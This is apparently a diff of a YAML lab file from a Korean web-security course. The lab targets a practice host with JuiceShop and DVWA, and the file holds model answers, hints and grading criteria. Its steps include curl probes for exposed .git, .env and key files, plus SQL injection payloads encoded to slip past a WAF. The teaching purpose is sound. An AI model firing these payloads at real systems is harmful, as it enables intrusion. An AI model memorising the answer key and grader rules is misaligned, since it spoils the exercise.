-    \ 민감 파일(.bak, .git, .env) 접근 차단\n   Apache: <FilesMatch> deny 규칙\n3. 에러 메시지 최소화\n   NODE_ENV=production\
-    \ 설정\n\n[단기 조치 - HIGH]\n4. Server 헤더 최소화: ServerTokens Prod\n5. X-Powered-By 헤더 제거\n6. CORS 허용 도메인\
-    \ 제한\n7. WAF 규칙 전 메서드/인코딩 대응 강화\n\n[중기 조치 - MEDIUM]\n8. 보안 헤더 추가: HSTS, CSP, X-Frame-Options\n9. 불필요한\
-    \ HTTP 메서드(PUT, DELETE, TRACE) 비활성화\n10. TLS 1.2+ 강제, 약한 암호화 스위트 제거\n\n[WAF 우회 결과]\n  이중인코딩: CRS 3.x에서\
-    \ 차단됨\n  대소문자혼합: (?i) 매칭으로 차단됨\n  SQL주석: CRS에서 차단됨\n  HPP: 부분적 우회 가능성 존재\nEOF\ncat /tmp/misconfig_report.txt"
-  answer_detail: 보안 설정 오류(Security Misconfiguration)는 OWASP Top 10 2021의 A05입니다. 자동화된 설정 점검(Chef InSpec,
-    Ansible, CIS Benchmark)으로 지속적인 컴플라이언스를 유지하고, 정기적인 보안 스캔으로 새로운 설정 오류를 탐지해야 합니다.
+  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): cat\
+    \ > /tmp/misconfig_report.txt << 'EOF'\n=== 보안 설정 오류 종합 점검 보고서 ===\n대상: 10.20.30.80\
+    \ (Apache:80, JuiceShop:3000, DVWA:8080)\n\n[즉시 조치 - CRITICAL]\n1. 디렉터리 리스팅 비활성화\n\
+    \   Apache: Options -Indexes\n   Express: 정적 파일 서빙 경로 제한\n2. 민감 파일(.bak, .git,\
+    \ .env) 접근 차단\n   Apache: <FilesMatch> deny 규칙\n3. 에러 메시지 최소화\n   NODE_ENV=production\
+    \ 설정\n\n[단기 조치 - HIGH]\n4. Server 헤더 최소화: ServerTokens Prod\n5. X-Powered-By 헤더\
+    \ 제거\n6. CORS 허용 도메인 제한\n7. WAF 규칙 전 메서드/인코딩 대응 강화\n\n[중기 조치 - MEDIUM]\n8. 보안\
+    \ 헤더 추가: HSTS, CSP, X-Frame-Options\n9. 불필요한 HTTP 메서드(PUT, DELETE, TRACE) 비활성화\n\
+    10. TLS 1.2+ 강제, 약한 암호화 스위트 제거\n\n[WAF 우회 결과]\n  이중인코딩: CRS 3.x에서 차단됨\n  대소문자혼합:\
+    \ (?i) 매칭으로 차단됨\n  SQL주석: CRS에서 차단됨\n  HPP: 부분적 우회 가능성 존재\nEOF\ncat /tmp/misconfig_report.txt"
+  answer_detail: 보안 설정 오류(Security Misconfiguration)는 OWASP Top 10 2021의 A05입니다. 자동화된
+    설정 점검(Chef InSpec, Ansible, CIS Benchmark)으로 지속적인 컴플라이언스를 유지하고, 정기적인 보안 스캔으로 새로운
+    설정 오류를 탐지해야 합니다.
   verify:
     type: output_contains
     expect: 보안 설정 오류 종합 점검 보고서
     field: stdout
     semantic:
-      intent: Misconfig 종합 — [즉시] 디렉터리 리스팅 off + 민감 파일 차단 + 에러 최소화 + [단기] Server 헤더 + X-Powered-By 제거
-        + CORS 제한 + WAF 강화 + [중기] HSTS/CSP/X-Frame + HTTP 메서드 비활성 + TLS 강화. OWASP A05 + CIS Benchmark.
+      intent: Misconfig 종합 — [즉시] 디렉터리 리스팅 off + 민감 파일 차단 + 에러 최소화 + [단기] Server 헤더
+        + X-Powered-By 제거 + CORS 제한 + WAF 강화 + [중기] HSTS/CSP/X-Frame + HTTP 메서드 비활성
+        + TLS 강화. OWASP A05 + CIS Benchmark.
       success_criteria:
       - 보안 설정 오류 종합 점검 보고서 키워드
       - CRITICAL/HIGH/MEDIUM 분류
@@ -346,47 +469,41 @@ steps:
       - 자동화 맥락 없음
   target_vm: attacker
 - order: 99
-  instruction: |
-    [복합 시나리오] "CVSS v3.1 적용 — 설정 오류 + WAF 우회 점검 → 우선순위 보고서"
+  instruction: "[복합 시나리오] \"CVSS v3.1 적용 — 설정 오류 + WAF 우회 점검 → 우선순위 보고서\"\n\n## 상황\
+    \ (w13 → w14 시나리오 연속)\n\n> 선배: \"보고서의 핵심은 *우선순위*. CVSS v3.1 + 구현 난이도 두 축으로 'Quick\
+    \ Win' 부터 정렬.\n> 설정 오류 + WAF 우회 점검 + CVSS 보고서.\"\n\n학습 목표 (lecture #1·#2·#3·#4\
+    \ CVSS+PoC+보고서+우선순위) + (lab #3·#4·#7·#8 디렉터리·파일·인코딩·메서드 우회) 통합.\n\n## 임무 (3 단계,\
+    \ 약 35분)\n\nNon-AI 트랙: ssh ccc@10.20.30.201 (attacker VM) 직접 실행.\n\n### Phase\
+    \ A — 노출 정찰\n`for p in '/ftp/' '/assets/' '/encryptionkeys/' '/.git/' '/.env'\
+    \ '/backup.sql'; do\n   echo -n \"$p: \"; curl -s -o /dev/null -w \"%{http_code}\\\
+    n\" \"http://10.20.30.80$p\"; done`\n`curl -s -I http://10.20.30.80/ | grep -E\
+    \ \"Server|X-Powered\"`\n`curl -s \"http://10.20.30.80/api/Users/abc%27%22\" |\
+    \ head -c 300`\n\n### Phase B — WAF 우회 3 기법\n`curl -s -o /dev/null -w \"double-enc:\
+    \ %{http_code}\\n\" \"http://10.20.30.80/rest/products/search?q=%2527%2520OR%25201%253D1--\"\
+    `\n`curl -s -o /dev/null -w \"case-mix: %{http_code}\\n\" \"http://10.20.30.80/rest/products/search?q=%27%20Or%201%3D1--\"\
+    `\n`curl -s -o /dev/null -w \"method-PUT: %{http_code}\\n\" -X PUT -H \"Content-Type:\
+    \ application/xml\" -d \"<x>data</x>\" \"http://10.20.30.80/rest/user/login\"\
+    `\n\n### Phase C — CVSS v3.1 + 우선순위 보고서\n| 발견 | CVSS Vector | Score | 구현 난이도 |\
+    \ 우선순위 |\n| /.git 노출 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N | 7.5 High | 낮음 | #1\
+    \ Quick Win |\n| Server header | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | 5.3 Medium\
+    \ | 낮음 | #2 |\n| WAF URL 이중 인코딩 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 9.8 Critical\
+    \ | 높음 | #3 |\n| /encryptionkeys | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 9.8 Critical\
+    \ | 낮음 | #1 Critical+Quick |\n| 에러 stack trace | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N\
+    \ | 5.3 Medium | 낮음 | #2 |\n표 끝 \"권고: Quick Win 4개 (autoindex off + Server 제거\
+    \ + custom error + .git 차단) 즉시.\nWAF 룰 재설계 단계적.\" 한 줄.\n\n종료: echo \"=== Phase\
+    \ A ===\" / \"=== Phase B ===\" / \"=== Phase C CVSS+우선순위 ===\".\n\n\n[도구 권장]\
+    \ **curl 단독 의존 금지**. 카테고리 `integration_scenario` 에 적합한 도구: 여러 도구 chain — 정찰 (whatweb/nmap)\
+    \ → 식별 (sqlmap/xsstrike) → 후속 작업. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote**\
+    \ 해야 채점 통과."
+  hint: 'Phase A: 6 경로 + Server + 에러 정찰.
 
-    ## 상황 (w13 → w14 시나리오 연속)
-
-    > 선배: "보고서의 핵심은 *우선순위*. CVSS v3.1 + 구현 난이도 두 축으로 'Quick Win' 부터 정렬.
-    > 설정 오류 + WAF 우회 점검 + CVSS 보고서."
-
-    학습 목표 (lecture #1·#2·#3·#4 CVSS+PoC+보고서+우선순위) + (lab #3·#4·#7·#8 디렉터리·파일·인코딩·메서드 우회) 통합.
-
-    ## 임무 (3 단계, 약 35분)
-
-    Non-AI 트랙: ssh ccc@10.20.30.201 (attacker VM) 직접 실행.
-
-    ### Phase A — 노출 정찰
-    `for p in '/ftp/' '/assets/' '/encryptionkeys/' '/.git/' '/.env' '/backup.sql'; do
-       echo -n "$p: "; curl -s -o /dev/null -w "%{http_code}\n" "http://10.20.30.80$p"; done`
-    `curl -s -I http://10.20.30.80/ | grep -E "Server|X-Powered"`
-    `curl -s "http://10.20.30.80/api/Users/abc%27%22" | head -c 300`
-
-    ### Phase B — WAF 우회 3 기법
-    `curl -s -o /dev/null -w "double-enc: %{http_code}\n" "http://10.20.30.80/rest/products/search?q=%2527%2520OR%25201%253D1--"`
-    `curl -s -o /dev/null -w "case-mix: %{http_code}\n" "http://10.20.30.80/rest/products/search?q=%27%20Or%201%3D1--"`
-    `curl -s -o /dev/null -w "method-PUT: %{http_code}\n" -X PUT -H "Content-Type: application/xml" -d "<x>data</x>" "http://10.20.30.80/rest/user/login"`
-
-    ### Phase C — CVSS v3.1 + 우선순위 보고서
-    | 발견 | CVSS Vector | Score | 구현 난이도 | 우선순위 |
-    | /.git 노출 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N | 7.5 High | 낮음 | #1 Quick Win |
-    | Server header | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | 5.3 Medium | 낮음 | #2 |
-    | WAF URL 이중 인코딩 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 9.8 Critical | 높음 | #3 |
-    | /encryptionkeys | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 9.8 Critical | 낮음 | #1 Critical+Quick |
-    | 에러 stack trace | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | 5.3 Medium | 낮음 | #2 |
-    표 끝 "권고: Quick Win 4개 (autoindex off + Server 제거 + custom error + .git 차단) 즉시.
-    WAF 룰 재설계 단계적." 한 줄.
-
-    종료: echo "=== Phase A ===" / "=== Phase B ===" / "=== Phase C CVSS+우선순위 ===".
-  hint: |
-    Phase A: 6 경로 + Server + 에러 정찰.
     Phase B: 같은 SQLi 3 변형. 차단 정상.
+
     Phase C: 5행 CVSS + 우선순위.
+
     포인트: CVSS vector + 구현 난이도 두 축 + Quick Win.
+
+    '
   category: integration_scenario
   points: 50
   verify:
@@ -394,9 +511,11 @@ steps:
     expect: 우선순위
     field: stdout
     semantic:
-      intent: |
-        설정 오류 + WAF 우회 + CVSS v3.1 우선순위 보고서.
+      intent: '설정 오류 + WAF 우회 + CVSS v3.1 우선순위 보고서.
+
         lecture #1·#2·#3·#4 + lab #3·#4·#7·#8 동시 행동 증명.
+
+        '
       success_criteria:
       - Phase A — 6 경로 + Server + 에러
       - Phase B — 3 우회 기법
@@ -413,5 +532,7 @@ steps:
       - Quick Win 누락
   target_vm: attacker
   risk_level: low
-  answer_detail: |
-    학생이 ssh attacker 직접. CVSS v3.1 vector + Quick Win 우선순위. 의사결정자 가독성 핵심.
+  answer_detail: '학생이 ssh attacker 직접. CVSS v3.1 vector + Quick Win 우선순위. 의사결정자 가독성
+    핵심.
+
+    '
